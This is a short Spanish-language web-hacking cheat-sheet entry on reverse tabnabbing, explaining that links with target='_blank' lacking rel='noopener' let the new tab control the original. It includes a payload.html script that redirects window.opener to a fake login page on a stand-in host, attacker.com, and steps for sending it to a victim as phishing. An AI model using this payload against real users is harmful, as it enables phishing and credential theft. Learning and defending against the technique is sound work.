---
title: "Target Blank (Reverse Tabnabbing)"
layout: "single"
category: "Web Hacking"
slug: "web-hacking/target-blank"
date: "2025-11-26"
---

### Concepto
Si un enlace usa `target="_blank"` sin `rel="noopener"`, la nueva pestaña controla la anterior.

### Explotación (Phishing)
1.  Crea `payload.html`:
    ```html
    <script>
    if (window.opener) window.opener.location = "http://attacker.com/fake-login.html";
    </script>
    ```
2.  Envía el enlace a la víctima.
3.  Cuando la víctima clica, su pestaña original cambia al login falso.
